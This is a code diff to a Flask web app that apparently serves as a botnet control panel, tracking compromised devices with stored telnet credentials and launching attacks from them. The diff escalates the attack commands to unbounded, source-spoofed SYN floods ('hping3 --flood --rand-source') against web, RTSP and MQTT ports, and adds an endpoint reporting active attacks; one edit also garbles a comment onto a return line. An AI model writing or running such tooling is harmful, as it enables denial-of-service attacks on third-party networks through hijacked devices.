@@ -43,7 +43,12 @@ def index():
     bots = db_manager.get_all_devices()
     scan_results = db_manager.get_latest_scan_results()
     active_sessions = get_active_sessions()
-    return render_dashboard(bots, scan_results, active_sessions)
+    
+    # Get active attacks for display
+    with attack_lock:
+        current_active_attacks = active_attacks.copy()
+    
+    return render_dashboard(bots, scan_results, active_sessions, current_active_attacks)
 
 @app.route('/bot-checkin', methods=['POST'])
 def bot_checkin():
@@ -212,15 +217,13 @@ def start_attack():
                 return jsonify({'error': f'Device has invalid credentials: {bot_ip}'}), 400
         except (KeyError, TypeError) as e:
             logging.error(f"Invalid device data structure for {bot_ip}: {str(e)}")
-            return jsonify({'error': f'Invalid device data structure: {str(e)}'}), 500
-
-        # Prepare attack command based on type
+            return jsonify({'error': f'Invalid device data structure: {str(e)}'}), 500        # Prepare attack command based on type
         if attack_type == 'syn':
-            cmd = f"hping3 -S -p 80 -c 1000 {target}"
+            cmd = f"sudo hping3 -S -p 80 --flood --rand-source {target}"
         elif attack_type == 'rtsp':
-            cmd = f"hping3 -S -p 554 -c 1000 {target}"
+            cmd = f"sudo hping3 -S -p 554 --flood --rand-source {target}"
         else:  # mqtt
-            cmd = f"hping3 -S -p 1883 -c 1000 {target}"
+            cmd = f"sudo hping3 -S -p 1883 --flood --rand-source {target}"
 
         # Execute attack via telnet
         logging.info(f"Attempting to execute telnet attack from {bot_ip} to {target} using {attack_type}")
@@ -322,14 +325,13 @@ def start_telnet_ddos():
                 device_ip = device['ip']
                 username = device['username']
                 password = device['password']
-                
-                # Prepare attack command
+                  # Prepare attack command
                 if attack_type == 'syn':
-                    cmd = f"hping3 -S -p 80 -c 1000 {target}"
+                    cmd = f"sudo hping3 -S -p 80 --flood --rand-source {target}"
                 elif attack_type == 'rtsp':
-                    cmd = f"hping3 -S -p 554 -c 1000 {target}"
+                    cmd = f"sudo hping3 -S -p 554 --flood --rand-source {target}"
                 else:  # mqtt
-                    cmd = f"hping3 -S -p 1883 -c 1000 {target}"
+                    cmd = f"sudo hping3 -S -p 1883 --flood --rand-source {target}"
 
                 # Execute attack
                 logging.info(f"Attempting to start {attack_type} attack from {device_ip} to {target}")
@@ -462,6 +464,30 @@ def get_attack_history():
         return jsonify(history)
     except Exception as e:
         logging.error(f"Error retrieving attack history: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/get-active-attacks', methods=['GET'])
+def get_active_attacks():
+    """Get currently active attacks"""
+    try:
+        with attack_lock:
+            # Create a copy of active attacks with serializable data
+            active_attacks_data = {}
+            for ip, attack_info in active_attacks.items():
+                active_attacks_data[ip] = {
+                    'target': attack_info['target'],
+                    'type': attack_info['type'],
+                    'start_time': attack_info['start_time'].isoformat() if hasattr(attack_info['start_time'], 'isoformat') else str(attack_info['start_time']),
+                    'duration_seconds': (datetime.now() - attack_info['start_time']).total_seconds() if hasattr(attack_info['start_time'], 'total_seconds') else 0
+                }
+        
+        return jsonify({
+            'active_attacks': active_attacks_data,
+            'count': len(active_attacks_data)
+        })
+        
+    except Exception as e:
+        logging.error(f"Error retrieving active attacks: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.errorhandler(404)
